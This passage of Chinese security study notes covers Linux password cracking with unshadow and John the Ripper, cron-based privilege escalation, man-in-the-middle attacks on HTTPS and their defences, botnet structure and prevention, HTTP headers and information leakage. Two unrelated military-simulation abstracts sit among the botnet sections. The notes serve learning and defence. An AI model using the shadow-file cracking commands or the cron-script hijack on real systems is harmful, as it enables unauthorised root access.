大多数Linux系统密码都和`/etc/passwd`和`/etc/shadow`这两个配置文件息息相关，passwd存储了用户，shadow存储了密码的hash，出于安全考虑passwd是全用户可读，root可写，shadow是仅root可读写的

#### <font color="yellow">004 破解用户名和密码</font>

`unshadow passwd shadow > cracked`

`john cracked`

计划任务：计划任务是一些定时执行的任务，由crontab管理，具有所属用户的权限，非root权限用户是不可以列出root用户的计划任务的，但`/etc/`内系统的计划任务可以被列出，默认这些程序由root权限执行，若有幸可将其中脚本配置成任意用户可写的管理员，即可修改脚本连回rootshell，若定时执行的文件是py脚本，可使用脚本来替换之前的脚本，靶场代码之前有写出来过

#### <font color="yellow">005 密码复用</font>

很多管理员会使用相同密码，即数据库或后台密码即是root密码

### <font color="yellow">04 中间人攻击</font>

https协议就是http+ssl协议

- https请求

	客户端向服务端发送https请求

- 生成公钥和私钥

	服务端收到请求之后，生成公钥和私钥，公钥相当于是锁，私钥相当于是钥匙，只有私钥才能够打开公钥锁住的内容

- 返回公钥 

	服务端将公钥(证书)返回给客户端，公钥里面包含有很多信息，比如证书的颁发机构、过期时间等等

- 客户端验证公钥 

	客户端收到公钥之后，首先会验证其是否有效，如颁发机构或者过期时间等，如果发现有问题就会抛出异常，提示证书存在问题，如果没有问题，那么就生成一个随机值，作为客户端的密钥，然后用服务端的公钥加密

- 发送客户端密钥 

	客户端用服务端的公钥加密密钥，然后发送给服务端

- 服务端收取密钥，对称加密内容 

	服务端收到经过加密的密钥，然后用私钥将其解密，得到客户端的密钥，然后服务端把要传输的内容和客户端的密钥进行对称加密，这样除非知道密钥，否则无法知道传输的内容

- 加密传输 

	服务端将经过加密的内容传输给客户端

- 获取加密内容，解密 

	客户端获取加密内容后，用之前生成的密钥对其进行解密，获取到内容

#### <font color="yellow">001 中间人劫持攻击</font>

https也不是绝对安全的，如下图所示为中间人劫持攻击，中间人可以获取到客户端与服务器之间所有的通信内容，中间人截取客户端发送给服务器的请求，然后伪装成客户端与服务器进行通信，将服务器返回给客户端的内容发送给客户端，伪装成服务器与客户端进行通信，通过这样的手段，便可以获取客户端和服务器之间通信的所有内容，使用中间人攻击手段，必须要让客户端信任中间人的证书，如果客户端不信任，则这种攻击手段也无法发挥作用

#### <font color="yellow">002 中间人攻击的预防</font>

造成中间人劫持的原因是没有对服务端证书及域名做校验或者校验不完整，为了方便，直接采用开源框架默认的校验方式进行https请求

#### <font color="yellow">003 对抗方法</font>

- 针对安全性要求比较高的app，可采取客户端预埋证书的方式锁死证书，只有当客户端证书和服务端的证书完全一致的情况下才允许通信，如一些银行类的app，但这种方式面临一个问题，证书过期的问题，因证书有一定的有效期，当预埋证书过期了，只有通过强制更新或者要求用户下载证书来解决
- 针对安全性要求一般的app，可采用通过校验域名，证书有效性、证书关键信息及证书链的方式

#### <font color="yellow">004 Webview的HTTPS安全</font>

目前很多应用都用webview加载H5页面，如果服务端采用的是可信CA颁发的证书，在`webView.setWebViewClient`(webviewClient)时重载WebViewClient的`onReceivedSslError()`，如果出现证书错误，直接调用`handler.proceed()`会忽略错误继续加载证书有问题的页面，如果调用`handler.cancel()`可以终止加载证书有问题的页面，证书出现问题了，可以提示用户风险，让用户选择加载与否，如果是需要安全级别比较高，可以直接终止页面加载，提示用户网络环境有风险

### <font color="yellow">05 发展僵尸网络</font>

#### <font color="yellow">001 简介</font>

僵尸网络的发展历程概括为5个阶段，分析各阶段特点和代表性僵尸网络，对僵尸网络进行形式化定义并依据命令控制信道拓扑结构将其划分为4类

当前僵尸网络研究热点归纳为

- 检测
- 追踪
- 测量
- 预测
- 对抗

僵尸网络之所以形成如此严重的威胁，从技术角度来开，主要有以下原因

僵尸网络是从传统蠕虫和木马发展而来的一种新的攻击形式，如从具有利用既有安全漏洞而快速传染扩散的有事，但存在感染大量计算机后不被控制者所控制的缺点，即攻击者无法利用已感染的计算机形成增值网络攻击，甚至因其不可控二无法获知蠕虫扩散熟读、感染规模和地理分布等基本信息

对僵尸网络的研究可归纳为

- 检测(detection)
- 追踪(tracking)
- 测量(measurement)
- 预测(prediction)
- 对抗(countermeasure)

其中

- 检测的目的是发现新的僵尸网络	
- 追踪的目的是获知僵尸网络的内部活动
- 测量的目的是掌握僵尸网络的拓扑结构、活跃规模、完全规模和变化轨迹
- 预测的目的是考虑未来可能出现的攻击技术并预先研究防御方法
- 对抗的目的是接管僵尸网络控制权或降低其可用性

##### <font color="yellow">0001 虚拟战争空间模型研究</font>

摘要

> 为了能够更加全面深刻地对现代信息化条件下的战争问题进行描述和分析，提出采用自底向上的综合建模方法，即多Agent建模方法，在计算机上构建能够体现军事作战行动在军事、经济、政治和社会领域综合效应，并考虑全球背景影响的虚拟战争空间模型
> 
> 1. 首先阐述了虚拟战争空间的基本概念，给出了虚拟战争空间模型的基本组成与结构
> 2. 然后讨论了建模需要解决的关键技术问题
> 3. 最后对该领域研究的工作实践进行了总结

虚拟全球战争空间是对战争系统的一个整体建模，力图通过模拟战争系统状态在战争进程中的演化过程，反映出战争系统在空间、时间上的综合效果，模型从某种意义上看，就是战争的一个平行系统，将战争问题放入这个空间中，通过观察或试验模拟的战争系统，就可以研究战争的一般规律和特殊规律，以达到认识战争的目的

虚拟战争空间模型的基本组成与结构

> 虚拟战争空间从建模思路上是采用的自底向上的Agent建模方法，系统具有涌现性和演化
> 
> 虚拟战争空间模型从逻辑上可以分为六层
> 
> 1. 最底层为虚拟战争空间模型系统提供大规模计算能力支撑和数据信息服务的计算环境层
> 2. 上一层是人口特征模型层和关键基础设施网络模型层
> 3. 三层为微观Agent行为模型层
> 4. 第四层为PMESI多领域综合模型层
> 5. 第五层为实验设计与运行管理层
> 6. 最上层为可视化分析系统，该层主要采用多领域，多角度，多层次可视化方法来展现系统运行的结果，为系统分析人员理解分析系统运行过程与结果提供一个可视化的交互手段
> 
> 在虚拟战争空间模型中，PMESI多领域综合模型层为体现其功能特征的关键部分，其基本模型可以划分为两类，一类是军事模型，另一个非军事的社会域模型

建模需要解决的关键技术问题

> 虚拟战争空间模型是一个非常复杂和庞大的计算机仿真模型系统，要构建这样一个系统需要解决的关键问题有很多，根据目前的研究工作实践，归纳起来大致有三个方面的关键问题
> 
> - 模型构建问题
> - 模型集成与仿真控制问题，其中大规模异构Agent模型集成与时空一致性问题最为突出
> - 超大规模计算能力的支撑问题

虚拟战争空间是一个新的概念，也是一个非常复杂的多领域综合模型系统，其根本目的是为全面深刻的研究和分析现代信息化条件下的战争问题在理论与技术上进行探索，在思考过程和研究实践中，虽然遇到的困惑、困难和问题很多，但是采用复杂系统的建模研究思路，把传统的军事作战仿真扩展到非军事的社会领域，并把它置于全球化背景下进行研究是符合现代战争问题研究分析的发展趋势的，本文通过对一些研究设想和研究工作实践的介绍，希望能够起到抛砖引玉的作用，以引起更多的学者专家对现代战争问题建模仿真方法研究的关注

##### <font color="yellow">0002 新型作战空间建模方针实践与体会</font>

传统的陆战、空战、海战武器平台以及相应的火力、侦察、探测行为模型，无法刻画类似于网络病毒、临近空间飞行器、空天飞机甚至是舆情传播等发生在新型作战空间中的新型作战行动

新型作战空间给建模仿真带来新的挑战

新型作战空间是新生事物且不断发展，认知还有待统一，传统建模方法难以有效解决新型作战空间建模面临的难题

- 传统自然环境建模方法无法体现新型作战空间的信息网络和体系对抗特征
- 传统物理域建模方法无法描述新型作战空间在信息域和认知域的作战机理
- 传统火力损耗建模方法无法刻画新型作战空间对体系作战能力的核心作用

重点介绍了网电空间、太空域和社会域，这三类典型新型作战空间建模仿真过程中遇到的突出问题、解决思路和经验成果

> 网电空间
> 
> - 网电空间不是传统作战空间的简单延展
> 	
>   网电空间依托电磁装备，联网生成，目的是人感和人控，是一个建立在物理空间之上，为认知服务的特殊空间
> 
> - 网电空间应重点对虚拟实体和虚拟实体与物理实体的关联，以及对感知、判断、决策等认知行动的影响进行描述
> 	
>   网电空间对抗不能等同于体系对抗中一般意义的作战行动
> 	
>   网电空间对抗不是简单的作战行动，而是能直接影响体系本身甚至是人的认知的核心作战行动，成为体系对抗的核心
> 
> - 网电空间在体系作战能力形成和发挥过程中起核心和基础作用，将网电空间影响的关注点放在反映体系网络化结构基础、网络化交互过程以及网络化级联效应等体系作战能力的整体性问题上
> 
> 网电空间战场信息网络建模：我们重点探索了基于网络之网络理论的战场信息网络建模技术，网络之网络的结构特点可归纳为以下三点
> 
> - 由多类异质网络组成的更大的网络
> - 每类网络具有特定任务使命和独立运行规律
> - 异质网络间存在相互依赖关系，即存在相依点或相依边

#### <font color="yellow">002 僵尸网络</font>

僵尸网络(简称机器人网络)是由感染的计算机网络的恶意软件在一个攻击方的控制之下，被称为僵尸牧民，每个在`bot-herder`控制下的个人机器被称为机器人，从一个中心点来看，攻击方可以命令其僵尸网络上的每台计算机同时执行协调的刑事诉讼，僵尸网络的规模(许多由数百万个僵尸程序组成)使攻击者能够执行以前不可能使用恶意软件的大规模操作，由于僵尸网络仍然受远程攻击者的控制，受感染的计算机可以动态接收更新并更改其行为，因此，僵尸牧民通常能够在黑市上租用他们的僵尸网络段，以获得巨大的经济收益

常见的僵尸网络操作包括

- 电子邮件垃圾邮件

        虽然电子邮件今天被视为攻击的旧版本，但垃圾邮件僵尸网络的规模最大，它们主要用于发送垃圾邮件，通常包括恶意软件，每个僵尸程序的数量都很高，例如，Cutwail僵尸网络每天最多可以发送740亿条消息，它们还用于传播机器人以向僵尸网络招募更多计算机

- DDoS攻击

        利用僵尸网络的大规模来使目标网络或服务器超载请求，使其无法访问目标用户，DDoS攻击针对个人或政治动机或勒索付款以换取停止攻击

- 财务违规

        包括专门为企业资金和信用卡信息直接盗窃而设计的僵尸网络，像ZeuS僵尸网络这样的金融僵尸网络一直负责在很短的时间内直接从多个企业窃取数百万美元的攻击

- 有针对性的入侵

        较小的僵尸网络旨在危害组织的特定高价值系统，攻击者可以从中渗透并进一步侵入网络，这些入侵对组织来说极其危险，因为攻击者专门针对他们最有价值的资产，包括财务数据，研发，知识产权和客户信息

当`bot-herder`使用文件共享，电子邮件或社交媒体应用程序协议或其他机器人作为中介将bot从他的命令和控制服务器发送给不知情的接收者时，创建僵尸网络，一旦收件人在他的计算机上打开恶意文件，机器人就会报告命令并控制`bot-herder`可以向受感染的计算机发出命令的位置

下面是一个说明这些关系的图表

> 机器人和僵尸网络的许多独特功能特性使它们非常适合长期入侵，`bot-herder`可以更新机器人，根据他/她希望他们做的事情来改变他们的整个功能，并适应目标系统的变化和对策，机器人还可以利用僵尸网络上的其他受感染计算机作为通信渠道，为僵尸牧民提供近乎无限数量的通信路径，以适应不断变化的选项并提供更新，这突出表明感染是最重要的一步，因为功能和通信方法总是可以在以后根据需要进行更改，作为最复杂的现代恶意软件之一，僵尸网络是政府，企业和个人的巨大网络安全问题，早期的恶意软件是一群独立的代理，只是简单地感染和复制自己，僵尸网络是集中协调的网络应用程序，利用网络来获得能力和弹性，由于受感染的计算机受远程`bot-herder`的控制，因此僵尸网络就像在网络中拥有恶意黑客，而不仅仅是恶意的可执行程序

僵尸网络已成为当今安全系统面临的最大威胁之一，它们在网络罪犯中越来越受欢迎，原因是它们能够渗透几乎所有联网设备，从DVR播放器到企业服务器，僵尸网络也越来越多地成为网络安全文化讨论的一部分，Facebook的虚假广告争议和Twitter机器人在2016年总统大选期间的惨败，令许多政界人士和公民担心僵尸网络的破坏性潜力，麻省理工学院(MIT)最近发表的研究得出结论，社交媒体机器人和自动账户在传播假新闻方面发挥着重要作用，利用僵尸网络来挖掘比特币等加密货币，是网络犯罪日益猖獗的一项业务，据预测，这一趋势将持续下去，导致更多电脑感染挖掘软件，更多数字钱包被盗，僵尸网络不仅是影响选举和挖掘加密货币的工具，对企业和消费者来说也很危险，因为它们被用来部署恶意软件、发起对网站的攻击、窃取个人信息和欺骗广告商，很明显僵尸网络是有害的，但它们到底是什么呢?如何保护您的个人信息和设备?

- 第一步是了解机器人是如何工作的
- 第二步是采取预防措施

##### <font color="yellow">0001 僵尸网络(Botnets)</font>

僵尸网络(Botnets)这个名称本身是robot和network两个单词的混合，从广义上讲，僵尸网络一个用来实施网络犯罪的机器人网络，控制它们的网络罪犯被称为僵尸主人或机器人牧人(Botmaster)

###### <font color="yellow">a. 规模很重要</font>

为了建立一个僵尸网络，Botmaster需要尽可能多感染在线设备, 连接的机器人越多，僵尸网络就越大，僵尸网络越大，影响就越大，想象一下，你召集了10个朋友在同一时间给机动车辆管理局打电话，除了震耳欲聋的电话铃声和公务员的匆忙之外，不会发生什么别的事情，现在，想象你召集100个朋友做同样的事情，如此大量的请求同时涌入，将使车管所的电话系统过载，可能会完全关闭，网络罪犯利用僵尸网络在互联网上制造类似的破坏，他们命令受感染的机器人大军使网站超载，使其无法正常运行或访问，这种攻击称为拒绝服务或DDoS

###### <font color="yellow">b. 僵尸网络感染</font>

僵尸网络的创建通常不仅仅是为了攻击一台电脑，它们被设计用来感染数百万台设备，Botmaster经常通过木马病毒在计算机上部署僵尸网络，这通常要求用户通过打开电子邮件附件、点击恶意弹出广告或从网站下载危险软件来感染自己的系统，在感染设备之后，僵尸网络就可以自由访问和修改个人信息，攻击其他计算机，并犯下其他罪行，更复杂的僵尸网络甚至可以自我传播，自动发现和感染设备，这类自主机器人执行寻找并感染任务，不断在网上搜索缺乏操作系统更新或杀毒软件的易受攻击的联网设备，僵尸网络很难被发现，它们只使用少量的计算能力，以避免干扰正常的设备功能和警告用户，更先进的僵尸网络甚至被设计成能更新自己的行为，以阻止网络安全软件的检测

###### <font color="yellow">c. 脆弱的设备</font>

僵尸网络几乎可以感染任何直接或无线连接到互联网的设备，个人电脑、笔记本电脑、移动设备、DVR、智能手表、安全摄像头和智能厨房电器都可能落入僵尸网络，尽管认为冰箱或咖啡机在不知情的情况下参与网络犯罪似乎很荒谬，但这种情况发生的频率比大多数人意识到的要高，通常，设备制造商使用不安全的密码来保护设备的进入，这使得在互联网上搜索的自动机器人很容易找到并利用这些密码，随着物联网(Internet of Things)的不断发展，越来越多的设备联网，网络犯罪分子有了更大的机会来扩大他们的僵尸网络，以及由此带来的影响程度，2016年，美国Dyn公司遭到大规模DDoS攻击，攻击使用了一个由安全摄像头和DVR组成的僵尸网络，DDoS扰乱了美国大部分地区的互联网服务，给Twitter和亚马逊(Amazon)等许多热门网站带来了问题

##### <font color="yellow">0002 僵尸网络攻击</font>

除了DDoS攻击，Botmaster还利用僵尸网络进行其他恶意攻击

###### <font color="yellow">a. 广告欺诈</font>

网络罪犯可以利用僵尸网络的综合处理能力来实施欺诈计划，例如，Botmaster通过命令数千台受感染的设备访问欺诈性网站，并点击放置在那里的广告，从而构建广告欺诈方案，每点击一次，黑客就会获得一定比例的广告费

###### <font color="yellow">b. 出售和租赁僵尸网络</font>

僵尸网络甚至可以在互联网上出售或出租，在感染了数千台设备之后，Botmaster会寻找其他有兴趣利用这些设备传播恶意软件的网络罪犯，僵尸网络买家然后进行网络攻击，散布勒索软件，或窃取个人信息

##### <font color="yellow">0003 僵尸网络结构</font>

僵尸网络结构通常有两种形式，每一种结构都被设计成尽可能多地给予僵尸主机控制

###### <font color="yellow">a. 客户机-服务器模型</font>

客户机-服务器僵尸网络结构类似于一个基本网络，其中有一个主服务器控制来自每个客户机的信息传输，Botmaster使用特殊的软件来建立命令和控制服务器(C&C服务器)，将指令转发给每个客户端设备，虽然客户机-服务器模型在获取和维护对僵尸网络的控制方面工作得很好，但是它有几个缺点：执法人员比较容易定位C&C服务器，而且它只有一个控制点，摧毁服务器，僵尸网络就死机了

###### <font color="yellow">b. 点对点(P2P)</font>

新的P2P僵尸网络不再依赖于一个集中的C&C服务器，而是使用了更加互联的点对点(P2P)结构，在P2P僵尸网络中，每个被感染的设备都扮演着客户端和服务器的角色，每个机器人都有一个其他受感染设备的列表，它们会寻找这些设备进行更新，并在它们之间传输信息，P2P僵尸网络结构使得执法部门更难找到任何集中的源头，缺乏单一的C&C服务器也使得P2P僵尸网络更难被破坏

##### <font color="yellow">0004 僵尸网络的预防</font>

现在已经了解了僵尸网络的工作原理，下面是一些防止僵尸网络的方法

###### <font color="yellow">a. 更新操作系统</font>

预防恶意软件的首要方法之一就是更新你的操作系统，软件开发人员积极打击恶意软件，他们很早就知道威胁何时出现，将操作系统设置为自动更新，并确保运行的是最新版本

###### <font color="yellow">b. 避免来自可疑或未知来源的电子邮件附件</font>

电子邮件附件是许多病毒最喜欢的感染源，不要打开来自未知来源的附件，甚至仔细检查朋友和家人发来的电子邮件，僵尸程序经常使用联系人列表来撰写和发送垃圾邮件和受感染的电子邮件，你朋友发来的邮件实际上可能是伪装的僵尸网络

###### <font color="yellow">c. 避免从P2P和文件共享网络下载</font>

僵尸网络利用P2P网络和文件共享服务来感染计算机，在执行文件之前扫描任何下载文件，或者找到传输文件的更安全的替代方法

###### <font color="yellow">d. 不要点击可疑链接</font>

恶意网站的链接是常见的感染点，所以在没有彻底检查的情况下，避免点击它们，将光标悬停在超文本上，查看URL的实际位置，恶意链接喜欢生活在留言板，YouTube评论，弹出广告，等等

###### <font color="yellow">e. 杀毒软件</font>

杀毒软件是避免和消除僵尸网络的最好方法，寻找设计用于覆盖所有设备而不仅仅是计算机的防病毒保护，僵尸网络渗透到所有类型的设备中，所以要关注范围广泛的软件

### <font color="yellow">06 http报头</font>

HTTP(Hyper Text Transfer Protocol)是超文本传输协议的缩写，它用于传送WWW方式的数据，关于HTTP协议的详细内容请参考`RFC2616`，HTTP协议采用了请求/响应模型，客户端向服务器发送一个请求，请求头包含请求的方法、URI、协议版本、以及包含请求修饰符、客户信息和内容的类似于MIME的消息结构，服务器以一个状态行作为响应，相应的内容包括消息协议的版本，成功或者错误编码加上包含服务器信息、实体元信息以及可能的实体内容，通常HTTP消息包括客户机向服务器的请求消息和服务器向客户机的响应消息，这两种类型的消息由一个起始行，一个或者多个头域，一个只是头域结束的空行和可选的消息体组成，HTTP的头域包括通用头，请求头，响应头和实体头四个部分，每个头域由一个域名，冒号(`:`)和域值三部分组成，域名是大小写无关的，域值前可以添加任何数量的空格符，头域可以被扩展为多行，在每行开始处，使用至少一个空格或制表符

#### <font color="yellow">001 通用头域</font>

通用头域包含请求和响应消息都支持的头域

通用头域包含

- `Cache-Control`
- `Connection`
- `Date`
- `Pragma`
- `Transfer-Encoding`
- `Upgrade`
- `Via`

对通用头域的扩展要求通讯双方都支持此扩展，如果存在不支持的通用头域，一般将会作为实体头域处理

下面简单介绍几个在UPnP消息中使用的通用头域

#### <font color="yellow">002 `Cache-Control`头域</font>

`Cache-Control`指定请求和响应遵循的缓存机制，在请求消息或响应消息中设置Cache-Control并不会修改另一个消息处理过程中的缓存处理过程

请求时的缓存指令包

- `no-cache`
- `no-store`
- `max-age`
- `max-stale`
- `min-fresh`
- `only-if-cached`

响应消息中的指令包括

- `public`
- `private`
- `no-cache`
- `no-store`
- `no-transform`
- `must-revalidate`
- `proxy-revalidate`
- `max-age`

各个消息中的指令含义如下

> `Public`指示响应可被任何缓存区缓存
> 
> `Private`指示对于单个用户的整个或部分响应消息，不能被共享缓存处理，这允许服务器仅仅描述当用户的部分响应消息，此响应消息对于其他用户的请求无效
> 
> `no-cache`指示请求或响应消息不能缓存
> 
> `no-store`用于防止重要的信息被无意的发布，在请求消息中发送将使得请求和响应消息都不使用缓存
> 
> `max-age`指示客户机可以接收生存期不大于指定时间(以秒为单位)的响应
> 
> `min-fresh`指示客户机可以接收响应时间小于当前时间加上指定时间的响应
> 
> `max-stale`指示客户机可以接收超出超时期间的响应消息，如果指定`max-stale`消息的值，那么客户机可以接收超出超时期指定值之内的响应消息

#### <font color="yellow">003 `Date`头域</font>

`Date`头域表示消息发送的时间，时间的描述格式由`rfc822`定义，例如，`Date:Mon,31Dec200104:25:57GMT`，`Date`描述的时间表示世界标准时，换算成本地时间，需要知道用户所在的时区

#### <font color="yellow">004 `Pragma`头域</font>

Pragma头域用来包含实现特定的指令，最常用的是`Pragma:no-cache`，在HTTP/1.1协议中，它的含义和`Cache-Control:no-cache`相同

#### <font color="yellow">005 请求消息</font>

请求消息的第一行为下面的格式

`MethodSPRequest-URISPHTTP-VersionCRLFMethod`表示对于`Request-URI`完成的方法，这个字段是大小写敏感的

包括

- OPTIONS
- GET
- HEAD
- POST
- PUT
- DELETE
- TRACE

方法`GET`和`HEAD`应该被所有的通用WEB服务器支持，其他所有方法的实现是可选的，`GET`方法取回由`Request-URI`标识的信息，`HEAD`方法也是取回由`Request-URI`标识的信息，只是可以在响应时，不返回消息体，`POST`方法可以请求服务器接收包含在请求中的实体信息，可以用于提交表单，向新闻组、BBS、邮件群组和数据库发送消息，`SP`表示空格，`Request-URI`遵循URI格式，在此字段为星号(`*`)时，说明请求并不用于某个特定的资源地址，而是用于服务器本身，`HTTP-Version`表示支持的HTTP版本，例如为HTTP/1.1，`CRLF`表示换行回车符，请求头域允许客户端向服务器传递关于请求或者关于客户机的附加信息

请求头域可能包含下列字段

- `Accept`
- `Accept-Charset`
- `Accept-Encoding`
- `Accept-Language`
- `Authorization`
- `From`
- `Host`
- `If-Modified-Since`
- `If-Match`
- `If-None-Match`
- `If-Range`
- `If-Range`
- `If-Unmodified-Since`
- `Max-Forwards`
- `Proxy-Authorization`
- `Range`
- `Referer`
- `User-Agent`

对请求头域的扩展要求通讯双方都支持，如果存在不支持的请求头域，一般将会作为实体头域处理

#### <font color="yellow">006 典型的请求消息</font>

```text
GET http://download.microtool.de:80/somedata.exe
Host: download.microtool.de
Accept:*/*
Pragma: no-cache
Cache-Control: no-cache
Referer: http://download.microtool.de/
User-Agent:Mozilla/4.04[en](Win95;I;Nav)
Range:bytes=554554-
```

上例第一行表示HTTP客户端(可能是浏览器、下载程序)通过`GET`方法获得指定URL下的文件

#### <font color="yellow">007 `Host`头域</font>

`Host`头域指定请求资源的Intenet主机和端口号，必须表示请求url的原始服务器或网关的位置，HTTP/1.1请求必须包含主机头域，否则系统会以400状态码返回

#### <font color="yellow">008 `Referer`头域</font>

`Referer`头域允许客户端指定请求uri的源资源地址，这可以允许服务器生成回退链表，可用来登陆、优化cache等，他也允许废除的或错误的连接由于维护的目的被追踪，如果请求的uri没有自己的uri地址，`Referer`不能被发送，如果指定的是部分uri地址，则此地址应该是一个相对地址

#### <font color="yellow">009 `Range`头域</font>

`Range`头域可以请求实体的一个或者多个子范围

例如

- 表示头500个字节：`bytes=0-499`
- 表示第二个500字节：`bytes=500-999`
- 表示最后500个字节：`bytes=-500`
- 表示500字节以后的范围：`bytes=500-`
- 第一个和最后一个字节：`bytes=0-0,-1`
- 同时指定几个范围：`bytes=500-600,601-999`

但是服务器可以忽略此请求头，如果无条件`GET`包含`Range`请求头，响应会以状态码`206 PartialContent`返回而不是以`200 OK`

#### <font color="yellow">010 `User-Agent`头域</font>

`User-Agent`头域的内容包含发出请求的用户信息

#### <font color="yellow">011 响应消息</font>

响应消息的第一行为下面的格式，`HTTP-VersionSPStatus-CodeSPReason-PhraseCRLF`，`HTTP-Version`表示支持的HTTP版本，例如为HTTP/1.1，`Status-Code`是一个三个数字的结果代码，`Reason-Phrase`给`Status-Code`提供一个简单的文本描述，`Status-Code`主要用于机器自动识别，`Reason-Phrase`主要用于帮助用户理解，`Status-Code`的第一个数字定义响应的类别，后两个数字没有分类的作用

第一个数字可能取5个不同的值

- 1xx

    信息响应类，表示接收到请求并且继续处理

- 2xx

    处理成功响应类，表示动作被成功接收、理解和接受

- 3xx

    重定向响应类，为了完成指定的动作，必须接受进一步处理

- 4xx

    客户端错误，客户请求包含语法错误或者是不能正确执行

- 5xx

    服务端错误，服务器不能正确执行一个正确的请求

响应头域允许服务器传递不能放在状态行的附加信息，这些域主要描述服务器的信息和Request-URI进一步的信息

响应头域包含

- `Age`
- `Location`
- `Proxy-Authenticate`
- `Public`
- `Retry-After`
- `Server`
- `Vary`
- `Warning`
- `WWW-Authenticate`

对响应头域的扩展要求通讯双方都支持，如果存在不支持的响应头域，一般将会作为实体头域处理

典型的响应消息

```text
HTTP/1.0200OK
Date:Mon,31Dec200104:25:57GMT
Server:Apache/1.3.14(Unix)
Content-type:text/html
Last-modified:Tue,17Apr200106:46:28GMT
Etag:"a030f020ac7c01:1e9f"
Content-length:39725426
Content-range:bytes554554-40279979/40279980
```

上例第一行表示HTTP服务端响应一个`GET`方法

#### <font color="yellow">012 `Location`响应头</font>

`Location`响应头用于重定向接收者到一个新URI地址

#### <font color="yellow">013 `Server`响应头</font>

`Server`响应头包含处理请求的原始服务器的软件信息，此域能包含多个产品标识和注释，产品标识一般按照重要性排序

#### <font color="yellow">014 实体</font>

请求消息和响应消息都可以包含实体信息，实体信息一般由实体头域和实体组成

实体头域包含关于实体的原信息，实体头包括

- `Allow`
- `Content-Base`
- `Content-Encoding`
- `Content-Language`
- `Content-Length`
- `Content-Location`
- `Content-MD5`
- `Content-Range`
- `Content-Type`
- `Etag`
- `Expires`
- `Last-Modified`
- `extension-header`

`extension-header`允许客户端定义新的实体头，但是这些域可能无法未接受方识别，实体可以是一个经过编码的字节流，它的编码方式由`Content-Encoding`或`Content-Type`定义，它的长度由`Content-Length`或`Content-Range`定义

#### <font color="yellow">015 `Content-Type`实体头</font>

`Content-Type`实体头用于向接收方指示实体的介质类型，指定`HEAD`方法送到接收方的实体介质类型，或`GET`方法发送的请求介质类型`Content-Range`实体头，`Content-Range`实体头用于指定整个实体中的一部分的插入位置，他也指示了整个实体的长度，在服务器向客户返回一个部分响应，它必须描述响应覆盖的范围和整个实体长度，一般格式为`Content-Range:bytes-unitSPfirst-byte-pos-last-byte-pos/entity-legth`，例如，传送头500个字节次字段的形式`Content-Range:bytes0-499/1234`如果一个http消息包含此节(例如，对范围请求的响应或对一系列范围的重叠请求)，`Content-Range`表示传送的范围，`Content-Length`表示实际传送的字节数

#### <font color="yellow">016 `Last-modified`实体头</font>

- `Allow`

	服务器支持哪些请求方法(如`GET`、`POST`等)

- `Content-Encoding`

	文档的编码(Encode)方法，只有在解码之后才可以得到`Content-Type`头指定的内容类型，利用gzip压缩文档能够显著地减少HTML文档的下载时间，Java的GZIPOutputStream可以很方便地进行gzip压缩，但只有Unix上的Netscape和Windows上的IE 4、IE 5才支持它，因此，Servlet应该通过查看`Accept-Encoding`头(即`request.getHeader(Accept- Encoding)`)检查浏览器是否支持gzip，为支持gzip的浏览器返回经gzip压缩的HTML页面，为其他浏览器返回普通页面

- `Content-Length`

	表示内容长度，只有当浏览器使用持久HTTP连接时才需要这个数据，如果你想要利用持久连接的优势，可以把输出文档写入`ByteArrayOutputStram`，完成后查看其大小，然后把该值放入`Content-Length`头，最后通过`byteArrayStream.writeTo(response.getOutputStream())`发送内容

- `Content-Type`

    表示后面的文档属于什么`MIME`类型，Servlet默认为`text/plain`，但通常需要显式地指定为`text/html`，由于经常要设置`Content-Type`，因此`HttpServletResponse`提供了一个专用的方法`setContentTyep`

- `Date`

	当前的`GMT`时间，你可以用`setDateHeader`来设置这个头以避免转换时间格式的麻烦

- `Expires`

	应该在什么时候认为文档已经过期，从而不再缓存它

- `Last-Modified`

	文档的最后改动时间，客户可以通过`If-Modified-Since`请求头提供一个日期，该请求将被视为一个条件`GET`，只有改动时间迟于指定时间的文档才会返回，否则返回一个`304 Not Modified`状态，`Last-Modified`也可用`setDateHeader`方法来设置

- `Location`

	表示客户应当到哪里去提取文档，`Location`通常不是直接设置的，而是通过`HttpServletResponse`的`sendRedirect`方法，该方法同时设置状态代码为302

- `Refresh`

	表示浏览器应该在多少时间之后刷新文档，以秒计，除了刷新当前文档之外，你还可以通过`setHeader("Refresh", "5; URL=http://host/path")`让浏览器读取指定的页面。，注意这种功能通常是通过设置HTML页面`HEAD`区的`＜META HTTP-EQUIV="Refresh" CONTENT="5;URL=http://host/path"＞`实现，这是因为，自动刷新或重定向对于那些不能使用CGI或Servlet的HTML编写者十分重要，但是，对于Servlet来说，直接设置`Refresh`头更加方便，注意`Refresh`的意义是N秒之后刷新本页面或访问指定页面，而不是每隔N秒刷新本页面或访问指定页面，因此，连续刷新要求每次都发送一个`Refresh`头，而发送204状态代码则可以阻止浏览器继续刷新，不管是使用`Refresh`头还是`＜META HTTP-EQUIV="Refresh" ...＞`，注意`Refresh`头不属于HTTP1.1正式规范的一部分，而是一个扩展，但Netscape和IE都支持它

- `Server`

	服务器名字，Servlet一般不设置这个值，而是由Web服务器自己设置

- `Set-Cookie`

	设置和页面关联的Cookie，Servlet不应使用`response.setHeader("Set-Cookie", ...)`，而是应使用`HttpServletResponse`提供的专用方法`addCookie`

- `WWW-Authenticate`

	客户应该在`Authorization`头中提供什么类型的授权信息，在包含`401 Unauthorized`状态行的应答中这个头是必需的，例如，`response.setHeader("WWW-Authenticate", "BASIC realm=＼"executives＼"")`，注意Servlet一般不进行这方面的处理，而是让Web服务器的专门机制来控制受密码保护页面的访问，例如`.htaccess`

### <font color="yellow">07 信息泄露</font>

#### <font color="yellow">001 信息泄露主要内容</font>

- 泄露系统的敏感信息
- 泄露用户敏感信息
- 泄露用户密码

#### <font color="yellow">002 信息泄露的途径</font>

- 错误信息失控
- SQL注入
- 水平权限管理不当
- XSS/CSRF

#### <font color="yellow">003 防止信息泄露手段</font>

- OAuth思想
- 一切行为由用户授权
- 授权行为不泄露敏感信息
- 授权汇过期

#### <font color="yellow">004 OAuth思想</font>

将业务和敏感资料分离，用户登录后派发凭证，执行业务时把凭证发给业务层，业务层拿用户发的凭证到敏感资料服务去取用户数据，没有凭证不能获取用户数据

#### <font color="yellow">005 Web源代码泄露</font>

通过工具暴破相关Web源代码泄露，最想强调的是github信息泄露了，直接去github上搜索，收获往往是大于付出，可能有人不自信认为没能力去SRC挖洞，可是肯定不敢说不会上网不会搜索，github相关的故事太多，但是给人引出的信息泄露远远不仅在这里

- github.com
- rubygems.org
- pan.baidu.com
- ...

